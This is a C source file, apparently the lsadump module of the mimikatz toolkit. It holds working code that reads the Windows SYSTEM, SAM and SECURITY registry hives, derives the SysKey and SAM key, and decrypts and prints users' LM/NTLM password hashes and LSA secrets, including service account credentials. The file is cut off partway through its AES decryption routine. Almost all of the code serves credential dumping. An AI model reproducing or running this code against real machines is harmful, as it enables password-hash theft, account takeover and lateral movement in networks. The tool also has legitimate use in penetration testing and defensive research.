/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "khul_m_lsadump.h"

const KUHL_M_C kuhl_m_c_lsadump[] = {
	{kuhl_m_lsadump_sam,	L"sam",			L"Get the SysKey to decrypt SAM entries (from registry or hives)"},
	{kuhl_m_lsadump_secrets,L"secrets",		L"Get the SysKey to decrypt SECRETS entries (from registry or hives)"},
	{kuhl_m_lsadump_samrpc,	L"samrpc",		L"Ask SAM Service to retrieve SAM entries (patch on the fly)"},
};

const KUHL_M kuhl_m_lsadump = {
	L"lsadump", L"LsaDump module", NULL,
	sizeof(kuhl_m_c_lsadump) / sizeof(KUHL_M_C), kuhl_m_c_lsadump, NULL, NULL
};

NTSTATUS kuhl_m_lsadump_sam(int argc, wchar_t * argv[])
{
	HANDLE hData;
	PKULL_M_REGISTRY_HANDLE hRegistry;
	HKEY hBase;
	BYTE sysKey[SYSKEY_LENGTH];
	BOOL isKeyOk = FALSE;

	if(argc)
	{
		hData = CreateFile(argv[0], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		if(hData != INVALID_HANDLE_VALUE)
		{
			if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hData, &hRegistry))
			{
				isKeyOk = kuhl_m_lsadump_getComputerAndSyskey(hRegistry, NULL, sysKey);
				kull_m_registry_close(hRegistry);
			}
			CloseHandle(hData);
		} else PRINT_ERROR_AUTO(L"CreateFile (SYSTEM hive)");

		if((argc > 1) && isKeyOk)
		{
			hData = CreateFile(argv[1], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
			if(hData != INVALID_HANDLE_VALUE)
			{
				if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hData, &hRegistry))
				{
					kuhl_m_lsadump_getUsersAndSamKey(hRegistry, NULL, sysKey);
					kull_m_registry_close(hRegistry);
				}
				CloseHandle(hData);
			} else PRINT_ERROR_AUTO(L"CreateFile (SAM hive)");
		}
	}
	else
	{
		if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_OWN, NULL, &hRegistry))
		{
			if(kull_m_registry_RegOpenKeyEx(hRegistry, HKEY_LOCAL_MACHINE, L"SYSTEM", 0, KEY_READ, &hBase))
			{
				isKeyOk = kuhl_m_lsadump_getComputerAndSyskey(hRegistry, hBase, sysKey);
				kull_m_registry_RegCloseKey(hRegistry, hBase);
			}
			if(isKeyOk)
			{
				if(kull_m_registry_RegOpenKeyEx(hRegistry, HKEY_LOCAL_MACHINE, L"SAM", 0, KEY_READ, &hBase))
				{
					kuhl_m_lsadump_getUsersAndSamKey(hRegistry, hBase, sysKey);
					kull_m_registry_RegCloseKey(hRegistry, hBase);
				}
				else PRINT_ERROR_AUTO(L"kull_m_registry_RegOpenKeyEx (SAM)");
			}
			kull_m_registry_close(hRegistry);
		}
	}
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_lsadump_secrets(int argc, wchar_t * argv[])
{
	HANDLE hDataSystem, hDataSecurity;
	PKULL_M_REGISTRY_HANDLE hSystem, hSecurity;
	HKEY hSystemBase, hSecurityBase;
	BYTE sysKey[SYSKEY_LENGTH];
	BOOL isKeyOk = FALSE;

	if(argc)
	{
		hDataSystem = CreateFile(argv[0], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		if(hDataSystem != INVALID_HANDLE_VALUE)
		{
			if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hDataSystem, &hSystem))
			{
				if(kuhl_m_lsadump_getComputerAndSyskey(hSystem, NULL, sysKey))
				{
					if(argc > 1)
					{
						hDataSecurity = CreateFile(argv[1], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
						if(hDataSecurity != INVALID_HANDLE_VALUE)
						{
							if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hDataSecurity, &hSecurity))
							{
								kuhl_m_lsadump_getLsaKeyAndSecrets(hSecurity, NULL, hSystem, NULL, sysKey);
								kull_m_registry_close(hSecurity);
							}
							CloseHandle(hDataSecurity);
						} else PRINT_ERROR_AUTO(L"CreateFile (SECURITY hive)");
					}
				}
				kull_m_registry_close(hSystem);
			}
			CloseHandle(hDataSystem);
		} else PRINT_ERROR_AUTO(L"CreateFile (SYSTEM hive)");
	}
	else
	{
		if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_OWN, NULL, &hSystem))
		{
			if(kull_m_registry_RegOpenKeyEx(hSystem, HKEY_LOCAL_MACHINE, L"SYSTEM", 0, KEY_READ, &hSystemBase))
			{
				if(kuhl_m_lsadump_getComputerAndSyskey(hSystem, hSystemBase, sysKey))
				{
					if(kull_m_registry_RegOpenKeyEx(hSystem, HKEY_LOCAL_MACHINE, L"SECURITY", 0, KEY_READ, &hSecurityBase))
					{
						kuhl_m_lsadump_getLsaKeyAndSecrets(hSystem, hSecurityBase, hSystem, hSystemBase, sysKey);
						kull_m_registry_RegCloseKey(hSystem, hSecurityBase);
					}
					else PRINT_ERROR_AUTO(L"kull_m_registry_RegOpenKeyEx (SECURITY)");
				}
				kull_m_registry_RegCloseKey(hSystem, hSystemBase);
			}
			kull_m_registry_close(hSystem);
		}
	}
	return STATUS_SUCCESS;
}

const wchar_t * kuhl_m_lsadump_CONTROLSET_SOURCES[] = {L"Current", L"Default"};
BOOL kuhl_m_lsadump_getCurrentControlSet(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hSystemBase, PHKEY phCurrentControlSet)
{
	BOOL status = FALSE;
	HKEY hSelect;
	DWORD i, szNeeded, controlSet;

	wchar_t currentControlSet[] = L"ControlSet000";

	if(kull_m_registry_RegOpenKeyEx(hRegistry, hSystemBase, L"Select", 0, KEY_READ, &hSelect))
	{
		for(i = 0; !status && (i < sizeof(kuhl_m_lsadump_CONTROLSET_SOURCES) / sizeof(wchar_t *)); i++)
		{
			szNeeded = sizeof(DWORD); 
			status = kull_m_registry_RegQueryValueEx(hRegistry, hSelect, kuhl_m_lsadump_CONTROLSET_SOURCES[i], 0, NULL, (LPBYTE) &controlSet, &szNeeded);
		}

		if(status)
		{
			status = FALSE;
			if(swprintf_s(currentControlSet + 10, 4, L"%03u", controlSet) != -1)
				status = kull_m_registry_RegOpenKeyEx(hRegistry, hSystemBase, currentControlSet, 0, KEY_READ, phCurrentControlSet);
		}
		kull_m_registry_RegCloseKey(hRegistry, hSelect);
	}
	return status;
}

const wchar_t * kuhl_m_lsadump_SYSKEY_NAMES[] = {L"JD", L"Skew1", L"GBG", L"Data"};
const BYTE kuhl_m_lsadump_SYSKEY_PERMUT[] = {11, 6, 7, 1, 8, 10, 14, 0, 3, 5, 2, 15, 13, 9, 12, 4};
BOOL kuhl_m_lsadump_getSyskey(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hLSA, LPBYTE sysKey)
{
	BOOL status = TRUE;
	DWORD i;
	HKEY hKey;
	wchar_t buffer[8 + 1];
	DWORD szBuffer;
	BYTE buffKey[SYSKEY_LENGTH];

	for(i = 0 ; (i < sizeof(kuhl_m_lsadump_SYSKEY_NAMES) / sizeof(wchar_t *)) && status; i++)
	{
		status = FALSE;
		if(kull_m_registry_RegOpenKeyEx(hRegistry, hLSA, kuhl_m_lsadump_SYSKEY_NAMES[i], 0, KEY_READ, &hKey))
		{
			szBuffer = 8 + 1;
			if(kull_m_registry_RegQueryInfoKey(hRegistry, hKey, buffer, &szBuffer, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL))
				status = swscanf_s(buffer, L"%x", (DWORD *) &buffKey[i*sizeof(DWORD)]) != -1;
			kull_m_registry_RegCloseKey(hRegistry, hKey);
		}
		else PRINT_ERROR(L"LSA Key Class read error\n");
	}
	for(i = 0; i < SYSKEY_LENGTH; i++)
		sysKey[i] = buffKey[kuhl_m_lsadump_SYSKEY_PERMUT[i]];	

	return status;
}

BOOL kuhl_m_lsadump_getComputerAndSyskey(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN HKEY hSystemBase, OUT LPBYTE sysKey)
{
	BOOL status = FALSE;
	wchar_t * computerName;
	HKEY hCurrentControlSet, hComputerNameOrLSA;
	DWORD szNeeded;

	if(kuhl_m_lsadump_getCurrentControlSet(hRegistry, hSystemBase, &hCurrentControlSet))
	{
		kprintf(L"Domain : ");
		if(kull_m_registry_RegOpenKeyEx(hRegistry, hCurrentControlSet, L"Control\\ComputerName\\ComputerName", 0, KEY_READ, &hComputerNameOrLSA))
		{
			szNeeded = 0;
			if(kull_m_registry_RegQueryValueEx(hRegistry, hComputerNameOrLSA, L"ComputerName", 0, NULL, NULL, &szNeeded))
			{
				if(computerName = (wchar_t *) LocalAlloc(LPTR, szNeeded + sizeof(wchar_t)))
				{
					if(kull_m_registry_RegQueryValueEx(hRegistry, hComputerNameOrLSA, L"ComputerName", 0, NULL, (LPBYTE) computerName, &szNeeded))
						kprintf(L"%s\n", computerName);
					else PRINT_ERROR(L"kull_m_registry_RegQueryValueEx ComputerName KO\n");
					LocalFree(computerName);
				}
			}
			else PRINT_ERROR(L"pre - kull_m_registry_RegQueryValueEx ComputerName KO\n");
			kull_m_registry_RegCloseKey(hRegistry, hComputerNameOrLSA);
		}
		else PRINT_ERROR(L"kull_m_registry_RegOpenKeyEx ComputerName KO\n");

		kprintf(L"SysKey : ");
		if(kull_m_registry_RegOpenKeyEx(hRegistry, hCurrentControlSet, L"Control\\LSA", 0, KEY_READ, &hComputerNameOrLSA))
		{
			if(status = kuhl_m_lsadump_getSyskey(hRegistry, hComputerNameOrLSA, sysKey))
			{
				kull_m_string_wprintf_hex(sysKey, SYSKEY_LENGTH, 0);
				kprintf(L"\n");
			} else PRINT_ERROR(L"kuhl_m_lsadump_getSyskey KO\n");

			kull_m_registry_RegCloseKey(hRegistry, hComputerNameOrLSA);
		}
		else PRINT_ERROR(L"kull_m_registry_RegOpenKeyEx LSA KO\n");

		kull_m_registry_RegCloseKey(hRegistry, hCurrentControlSet);
	}

	return status;
}

BOOL kuhl_m_lsadump_getUsersAndSamKey(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN HKEY hSAMBase, IN LPBYTE sysKey)
{
	BOOL status = FALSE;
	BYTE samKey[SAM_KEY_DATA_KEY_LENGTH];
	wchar_t * user;
	HKEY hAccount, hUsers, hUser;
	DWORD i, nbSubKeys, szMaxSubKeyLen, szUser, rid;
	PUSER_ACCOUNT_V pUAv;

	if(kull_m_registry_RegOpenKeyEx(hRegistry, hSAMBase, L"SAM\\Domains\\Account", 0, KEY_READ, &hAccount))
	{
		if(kuhl_m_lsadump_getSamKey(hRegistry, hAccount, sysKey, samKey))
		{
			if(kull_m_registry_RegOpenKeyEx(hRegistry, hAccount, L"Users", 0, KEY_READ, &hUsers))
			{
				if(status = kull_m_registry_RegQueryInfoKey(hRegistry, hUsers, NULL, NULL, NULL, &nbSubKeys, &szMaxSubKeyLen, NULL, NULL, NULL, NULL, NULL, NULL))
				{
					szMaxSubKeyLen++;
					if(user = (wchar_t *) LocalAlloc(LPTR, (szMaxSubKeyLen + 1) * sizeof(wchar_t)))
					{
						for(i = 0; i < nbSubKeys; i++)
						{
							szUser = szMaxSubKeyLen;
							if(kull_m_registry_RegEnumKeyEx(hRegistry, hUsers, i, user, &szUser, NULL, NULL, NULL, NULL))
							{
								if(_wcsicmp(user, L"Names"))
								{
									if(swscanf_s(user, L"%x", &rid) != -1)
									{
										kprintf(L"\nRID  : %08x (%u)\n", rid, rid);
										if(kull_m_registry_RegOpenKeyEx(hRegistry, hUsers, user, 0, KEY_READ, &hUser))
										{
											szUser = 0;
											if(kull_m_registry_RegQueryValueEx(hRegistry, hUser, L"V", 0, NULL, NULL, &szUser))
											{
												if(pUAv = (PUSER_ACCOUNT_V) LocalAlloc(LPTR, szUser))
												{
													if(status &= kull_m_registry_RegQueryValueEx(hRegistry, hUser, L"V", 0, NULL, (LPBYTE) pUAv, &szUser))
													{
														kprintf(L"User : %.*s\n", pUAv->Username.lenght / sizeof(wchar_t), (wchar_t *) (pUAv->datas + pUAv->Username.offset));
														kuhl_m_lsadump_getHash(&pUAv->LMHash, pUAv->datas, samKey, rid, FALSE);
														kuhl_m_lsadump_getHash(&pUAv->NTLMHash, pUAv->datas, samKey, rid, TRUE);
													}
													else PRINT_ERROR(L"kull_m_registry_RegQueryValueEx V KO\n");
													LocalFree(pUAv);
												}
											}
											else PRINT_ERROR(L"pre - kull_m_registry_RegQueryValueEx V KO\n");
											kull_m_registry_RegCloseKey(hRegistry, hUser);
										}
									}
								}
							}
						}
						LocalFree(user);
					}
				}
				kull_m_registry_RegCloseKey(hRegistry, hUsers);
			}
		} else PRINT_ERROR(L"kuhl_m_lsadump_getKe KO\n");
		kull_m_registry_RegCloseKey(hRegistry, hAccount);
	} else PRINT_ERROR_AUTO(L"kull_m_registry_RegOpenKeyEx SAM Accounts");

	return status;
}

const BYTE kuhl_m_lsadump_NTPASSWORD[] = "NTPASSWORD";
const BYTE kuhl_m_lsadump_LMPASSWORD[] = "LMPASSWORD";
BOOL kuhl_m_lsadump_getHash(PSAM_SENTRY pSamHash, LPCBYTE pStartOfData, LPCBYTE samKey, DWORD rid, BOOL isNtlm)
{
	BOOL status = FALSE;
	MD5_CTX md5ctx;
	BYTE cypheredHash[LM_NTLM_HASH_LENGTH], clearHash[LM_NTLM_HASH_LENGTH];
	CRYPTO_BUFFER cypheredHashBuffer = {LM_NTLM_HASH_LENGTH, LM_NTLM_HASH_LENGTH, cypheredHash}, keyBuffer = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest};

	kprintf(L"%s : ", isNtlm ? L"NTLM" : L"LM  ");
	if(pSamHash->offset && (pSamHash->lenght == sizeof(SAM_HASH)))
	{
		MD5Init(&md5ctx);
		MD5Update(&md5ctx, samKey, SAM_KEY_DATA_KEY_LENGTH);
		MD5Update(&md5ctx, (PBYTE) &rid, sizeof(DWORD));
		MD5Update(&md5ctx, isNtlm ? kuhl_m_lsadump_NTPASSWORD : kuhl_m_lsadump_LMPASSWORD , isNtlm ? sizeof(kuhl_m_lsadump_NTPASSWORD) : sizeof(kuhl_m_lsadump_LMPASSWORD));
		MD5Final(&md5ctx);

		RtlCopyMemory(cypheredHash, ((PSAM_HASH) (pStartOfData + pSamHash->offset))->hash, LM_NTLM_HASH_LENGTH);
		if(NT_SUCCESS(RtlEncryptDecryptRC4(&cypheredHashBuffer, &keyBuffer)))
		{
			if(status = NT_SUCCESS(RtlDecryptDES2blocks1DWORD(cypheredHash, &rid, clearHash)))
				kull_m_string_wprintf_hex(clearHash, LM_NTLM_HASH_LENGTH, 0);
			else PRINT_ERROR(L"RtlDecryptDES2blocks1DWORD");
		} else PRINT_ERROR(L"RtlEncryptDecryptARC4");
	}
	kprintf(L"\n");
	return status;
}

const BYTE kuhl_m_lsadump_qwertyuiopazxc[] = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%";
const BYTE kuhl_m_lsadump_01234567890123[] = "0123456789012345678901234567890123456789";
BOOL kuhl_m_lsadump_getSamKey(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hAccount, LPCBYTE sysKey, LPBYTE samKey)
{
	BOOL status = FALSE;
	PDOMAIN_ACCOUNT_F pDomAccF;
	MD5_CTX md5ctx;
	CRYPTO_BUFFER data = {SAM_KEY_DATA_KEY_LENGTH, SAM_KEY_DATA_KEY_LENGTH, samKey}, key = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest};
	DWORD szNeeded = 0;

	kprintf(L"\nSAMKey : ");
	if(kull_m_registry_RegQueryValueEx(hRegistry, hAccount, L"F", 0, NULL, NULL, &szNeeded))
	{
		if(pDomAccF = (PDOMAIN_ACCOUNT_F) LocalAlloc(LPTR, szNeeded))
		{
			if(kull_m_registry_RegQueryValueEx(hRegistry, hAccount, L"F", 0, NULL, (LPBYTE) pDomAccF, &szNeeded))
			{
				MD5Init(&md5ctx);
				MD5Update(&md5ctx, pDomAccF->keys1.Salt, SAM_KEY_DATA_SALT_LENGTH);
				MD5Update(&md5ctx, kuhl_m_lsadump_qwertyuiopazxc, sizeof(kuhl_m_lsadump_qwertyuiopazxc));
				MD5Update(&md5ctx, sysKey, SYSKEY_LENGTH);
				MD5Update(&md5ctx, kuhl_m_lsadump_01234567890123, sizeof(kuhl_m_lsadump_01234567890123));
				MD5Final(&md5ctx);

				RtlCopyMemory(samKey, pDomAccF->keys1.Key, SAM_KEY_DATA_KEY_LENGTH);
				if(status = NT_SUCCESS(RtlEncryptDecryptRC4(&data, &key)))
					kull_m_string_wprintf_hex(samKey, LM_NTLM_HASH_LENGTH, 0);
				else PRINT_ERROR(L"RtlEncryptDecryptARC4 KO");
			}
			else PRINT_ERROR(L"kull_m_registry_RegQueryValueEx F KO");
			LocalFree(pDomAccF);
		}
	}
	else PRINT_ERROR(L"pre - kull_m_registry_RegQueryValueEx F KO");
	kprintf(L"\n");
	return status;
}

BOOL kuhl_m_lsadump_getLsaKeyAndSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hSecurityBase, IN PKULL_M_REGISTRY_HANDLE hSystem, IN HKEY hSystemBase, IN LPBYTE sysKey)
{
	BOOL status = FALSE;
	HKEY hPolicy, hPolRev, hEncKey;
	POL_REVISION polRevision;
	DWORD szNeeded, i, offset;
	LPVOID buffer;
	MD5_CTX md5ctx;
	CRYPTO_BUFFER data = {3 * sizeof(NT5_SYSTEM_KEY), 3 * sizeof(NT5_SYSTEM_KEY), NULL}, key = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest};
	PNT6_SYSTEM_KEYS nt6keysStream = NULL;
	PNT6_SYSTEM_KEY nt6key;
	PNT5_SYSTEM_KEY nt5key = NULL;

	if(kull_m_registry_RegOpenKeyEx(hSecurity, hSecurityBase, L"Policy", 0, KEY_READ, &hPolicy))
	{
		if(kull_m_registry_RegOpenKeyEx(hSecurity, hPolicy, L"PolRevision", 0, KEY_READ, &hPolRev))
		{
			szNeeded = sizeof(POL_REVISION);
			if(kull_m_registry_RegQueryValueEx(hSecurity, hPolRev, NULL, 0, NULL, (LPBYTE) &polRevision, &szNeeded))
			{
				kprintf(L"\nPolicy subsystem is : %hu.%hu\n", polRevision.Major, polRevision.Minor);

				if(kull_m_registry_RegOpenKeyEx(hSecurity, hPolicy, (polRevision.Minor > 9) ? L"PolEKList" : L"PolSecretEncryptionKey", 0, KEY_READ, &hEncKey))
				{
					if(kull_m_registry_RegQueryValueEx(hSecurity, hEncKey, NULL, 0, NULL, NULL, &szNeeded))
					{
						if(buffer = LocalAlloc(LPTR, szNeeded))
						{
							if(kull_m_registry_RegQueryValueEx(hSecurity, hEncKey, NULL, 0, NULL, (LPBYTE) buffer, &szNeeded))
							{   
								if(polRevision.Minor > 9) // NT 6
								{
									if(kuhl_m_lsadump_sec_aes256((PNT6_HARD_SECRET) buffer, szNeeded, NULL, sysKey))
									{
										if(nt6keysStream = (PNT6_SYSTEM_KEYS) LocalAlloc(LPTR, ((PNT6_HARD_SECRET) buffer)->clearSecret.SecretSize))
										{
											RtlCopyMemory(nt6keysStream, ((PNT6_HARD_SECRET) buffer)->clearSecret.Secret, ((PNT6_HARD_SECRET) buffer)->clearSecret.SecretSize);
											kprintf(L"LSA Key(s) : %u, default {%08x-%04hx-%04hx-%02x%02x-%02x%02x%02x%02x%02x%02x}\n", nt6keysStream->nbKeys, nt6keysStream->CurrentKeyID.Data1, nt6keysStream->CurrentKeyID.Data2, nt6keysStream->CurrentKeyID.Data3, nt6keysStream->CurrentKeyID.Data4[0], nt6keysStream->CurrentKeyID.Data4[1], nt6keysStream->CurrentKeyID.Data4[2], nt6keysStream->CurrentKeyID.Data4[3], nt6keysStream->CurrentKeyID.Data4[4], nt6keysStream->CurrentKeyID.Data4[5], nt6keysStream->CurrentKeyID.Data4[6], nt6keysStream->CurrentKeyID.Data4[7]);
											for(i = 0, offset = 0; i < nt6keysStream->nbKeys; i++, offset += FIELD_OFFSET(NT6_SYSTEM_KEY, Key) + nt6key->KeySize)
											{
												nt6key = (PNT6_SYSTEM_KEY) ((PBYTE) nt6keysStream->Keys + offset);
												kprintf(L"  [%02u] {%08x-%04hx-%04hx-%02x%02x-%02x%02x%02x%02x%02x%02x} ", i, nt6key->KeyId.Data1, nt6key->KeyId.Data2, nt6key->KeyId.Data3, nt6key->KeyId.Data4[0], nt6key->KeyId.Data4[1], nt6key->KeyId.Data4[2], nt6key->KeyId.Data4[3], nt6key->KeyId.Data4[4], nt6key->KeyId.Data4[5], nt6key->KeyId.Data4[6], nt6key->KeyId.Data4[7]);
												kull_m_string_wprintf_hex(nt6key->Key, nt6key->KeySize, 0);
												kprintf(L"\n");
											}
										}
									}
								}
								else // NT 5
								{
									MD5Init(&md5ctx);
									MD5Update(&md5ctx, sysKey, SYSKEY_LENGTH);
									for(i = 0; i < 1000; i++)
										MD5Update(&md5ctx, ((PNT5_SYSTEM_KEYS) buffer)->lazyiv, LAZY_NT5_IV_SIZE);
									MD5Final(&md5ctx);
									data.Buffer = (PBYTE) ((PNT5_SYSTEM_KEYS) buffer)->keys;
									if(NT_SUCCESS(RtlEncryptDecryptRC4(&data, &key)))
									{
										if(nt5key = (PNT5_SYSTEM_KEY) LocalAlloc(LPTR, sizeof(NT5_SYSTEM_KEY)))
										{
											RtlCopyMemory(nt5key->key, ((PNT5_SYSTEM_KEYS) buffer)->keys[1].key, sizeof(NT5_SYSTEM_KEY));
											kprintf(L"LSA Key : "); 
											kull_m_string_wprintf_hex(nt5key->key, sizeof(NT5_SYSTEM_KEY), 0);
											kprintf(L"\n");
										}
									}
								}
							}
							LocalFree(buffer);
						}
					}
				}
			}
			kull_m_registry_RegCloseKey(hSecurity, hPolRev);
		}

		if(nt6keysStream || nt5key)
			kuhl_m_lsadump_getSecrets(hSecurity, hPolicy, hSystem, hSystemBase, nt6keysStream, nt5key);

		kull_m_registry_RegCloseKey(hSecurity, hPolicy);
	}

	if(nt6keysStream)
		LocalFree(nt6keysStream);
	if(nt5key)
		LocalFree(nt5key);

	return status;
}

BOOL kuhl_m_lsadump_getSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPolicyBase, IN PKULL_M_REGISTRY_HANDLE hSystem, IN HKEY hSystemBase, PNT6_SYSTEM_KEYS lsaKeysStream, PNT5_SYSTEM_KEY lsaKeyUnique)
{
	BOOL status = FALSE;
	HKEY hSecrets, hSecret, hValue, hCurrentControlSet, hServiceBase;
	DWORD i, nbSubKeys, szMaxSubKeyLen, szSecretName;
	wchar_t * secretName;

	if(kull_m_registry_RegOpenKeyEx(hSecurity, hPolicyBase, L"Secrets", 0, KEY_READ, &hSecrets))
	{
		if(kuhl_m_lsadump_getCurrentControlSet(hSystem, hSystemBase, &hCurrentControlSet))
		{
			if(kull_m_registry_RegOpenKeyEx(hSystem, hCurrentControlSet, L"services", 0, KEY_READ, &hServiceBase))
			{
				if(kull_m_registry_RegQueryInfoKey(hSecurity, hSecrets, NULL, NULL, NULL, &nbSubKeys, &szMaxSubKeyLen, NULL, NULL, NULL, NULL, NULL, NULL))
				{
					szMaxSubKeyLen++;
					if(secretName = (wchar_t *) LocalAlloc(LPTR, (szMaxSubKeyLen + 1) * sizeof(wchar_t)))
					{
						for(i = 0; i < nbSubKeys; i++)
						{
							szSecretName = szMaxSubKeyLen;
							if(kull_m_registry_RegEnumKeyEx(hSecurity, hSecrets, i, secretName, &szSecretName, NULL, NULL, NULL, NULL))
							{
								kprintf(L"\nSecret  : %s", secretName);

								if(_wcsnicmp(secretName, L"_SC_", 4) == 0)
									kuhl_m_lsadump_getInfosFromServiceName(hSystem, hServiceBase, secretName + 4);

								if(kull_m_registry_RegOpenKeyEx(hSecurity, hSecrets, secretName, 0, KEY_READ, &hSecret))
								{
									if(kull_m_registry_RegOpenKeyEx(hSecurity, hSecret, L"CurrVal", 0, KEY_READ, &hValue))
									{
										kuhl_m_lsadump_decryptSecret(hSecurity, hValue, L"\ncur/", lsaKeysStream, lsaKeyUnique);
										kull_m_registry_RegCloseKey(hSecurity, hValue);
									}
									if(kull_m_registry_RegOpenKeyEx(hSecurity, hSecret, L"OldVal", 0, KEY_READ, &hValue))
									{
										kuhl_m_lsadump_decryptSecret(hSecurity, hValue, L"\nold/", lsaKeysStream, lsaKeyUnique);
										kull_m_registry_RegCloseKey(hSecurity, hValue);
									}
									kull_m_registry_RegCloseKey(hSecurity, hSecret);
								}
								kprintf(L"\n");
							}
						}
						LocalFree(secretName);
					}
				}
				kull_m_registry_RegCloseKey(hSystem, hServiceBase);
			}
			kull_m_registry_RegCloseKey(hSystem, hCurrentControlSet);
		}
		kull_m_registry_RegCloseKey(hSecurity, hSecrets);
	}
	return status;
}

void kuhl_m_lsadump_getInfosFromServiceName(IN PKULL_M_REGISTRY_HANDLE hSystem, IN HKEY hSystemBase, IN PCWSTR serviceName)
{
	HKEY hService;
	DWORD szNeeded;
	wchar_t * objectName;
	if(kull_m_registry_RegOpenKeyEx(hSystem, hSystemBase, serviceName, 0, KEY_READ, &hService))
	{
		if(kull_m_registry_RegQueryValueEx(hSystem, hService, L"ObjectName", 0, NULL, NULL, &szNeeded))
		{
			if(objectName = (wchar_t *) LocalAlloc(LPTR, szNeeded + sizeof(wchar_t)))
			{
				if(kull_m_registry_RegQueryValueEx(hSystem, hService, L"ObjectName", 0, NULL, (LPBYTE) objectName, &szNeeded))
					kprintf(L" / service \'%s\' with username : %s", serviceName, objectName);
				LocalFree(objectName);
			}
		}
		kull_m_registry_RegCloseKey(hSystem, hService);
	}
}

void kuhl_m_lsadump_decryptSecret(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hSecret, IN PCWSTR prefix, IN PNT6_SYSTEM_KEYS lsaKeysStream, IN PNT5_SYSTEM_KEY lsaKeyUnique)
{
	DWORD szSecret = 0;
	PBYTE secret;
	CRYPTO_BUFFER data, output = {0, 0, NULL}, key = {sizeof(NT5_SYSTEM_KEY), sizeof(NT5_SYSTEM_KEY), NULL};

	if(kull_m_registry_RegQueryValueEx(hSecurity, hSecret, NULL, 0, NULL, NULL, &szSecret))
	{
		if(secret = (PBYTE) LocalAlloc(LPTR, szSecret))
		{
			if(kull_m_registry_RegQueryValueEx(hSecurity, hSecret, NULL, 0, NULL, secret, &szSecret))
			{
				if(lsaKeysStream)
				{
					if(kuhl_m_lsadump_sec_aes256((PNT6_HARD_SECRET) secret, szSecret, lsaKeysStream, NULL))
						kuhl_m_lsadump_candidateSecret(((PNT6_HARD_SECRET) secret)->clearSecret.SecretSize, ((PNT6_HARD_SECRET) secret)->clearSecret.Secret, prefix);
				}
				else if(lsaKeyUnique)
				{
					key.Buffer = lsaKeyUnique->key;
					data.Length = data.MaximumLength = ((PNT5_HARD_SECRET) secret)->encryptedStructSize;
					data.Buffer = ((PNT5_HARD_SECRET) secret)->encryptedSecret;

					if(RtlDecryptDESblocksECB(&data, &key, &output) == STATUS_BUFFER_TOO_SMALL)
					{
						if(output.Buffer = (PBYTE) LocalAlloc(LPTR, output.Length))
						{
							output.MaximumLength = output.Length;
							if(NT_SUCCESS(RtlDecryptDESblocksECB(&data, &key, &output)))
								kuhl_m_lsadump_candidateSecret(output.Length, output.Buffer, prefix);
							LocalFree(output.Buffer);
						}
					}
				}
			}
			else PRINT_ERROR(L"kull_m_registry_RegQueryValueEx Secret value KO\n");
			LocalFree(secret);
		}
	}
	else PRINT_ERROR(L"pre - kull_m_registry_RegQueryValueEx Secret value KO\n");
}

void kuhl_m_lsadump_candidateSecret(DWORD szBytesSecrets, PVOID bufferSecret, PCWSTR prefix)
{
	UNICODE_STRING candidateString = {(USHORT) szBytesSecrets, (USHORT) szBytesSecrets, (PWSTR) bufferSecret};
	BOOL isStringOk = FALSE;
	if(szBytesSecrets)
	{
		kprintf(L"%s", prefix);
		if(szBytesSecrets <= USHRT_MAX)
			if(isStringOk = kull_m_string_suspectUnicodeString(&candidateString))
				kprintf(L"text: %wZ", &candidateString);

		if(!isStringOk)
		{
			kprintf(L"hex : ");
			kull_m_string_wprintf_hex(bufferSecret, szBytesSecrets, 1);
		}
	}
}

BOOL kuhl_m_lsadump_sec_aes256(PNT6_HARD_SECRET hardSecretBlob, DWORD hardSecretBlobSize, PNT6_SYSTEM_KEYS lsaKeysStream, PBYTE sysKey)
{
	BOOL status = FALSE;
	DWORD i, offset, szNeeded;
	HCRYPTPROV hContext;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;
	PBYTE pKey = NULL;
	PNT6_SYSTEM_KEY lsaKey;
	AES_256_KEY_BLOB keyBlob = {{PLAINTEXTKEYBLOB, CUR_BLOB_VERSION, 0, CALG_AES_256}, AES_256_KEY_SIZE};

	if(lsaKeysStream)
	{
		for(i = 0, offset = 0; i < lsaKeysStream->nbKeys; i++, offset += FIELD_OFFSET(NT6_SYSTEM_KEY, Key) + lsaKey->KeySize)
		{
			lsaKey = (PNT6_SYSTEM_KEY) ((PBYTE) lsaKeysStream->Keys + offset);
			if(RtlEqualMemory(&hardSecretBlob->KeyId, &lsaKey->KeyId, sizeof(GUID)))
			{
				pKey = lsaKey->Key;
				szNeeded = lsaKey->KeySize;
				break;
			}
		}
	}
	else if(sysKey)
	{
		pKey = sysKey;
		szNeeded = SYSKEY_LENGTH;
	}

	if(pKey)
	{
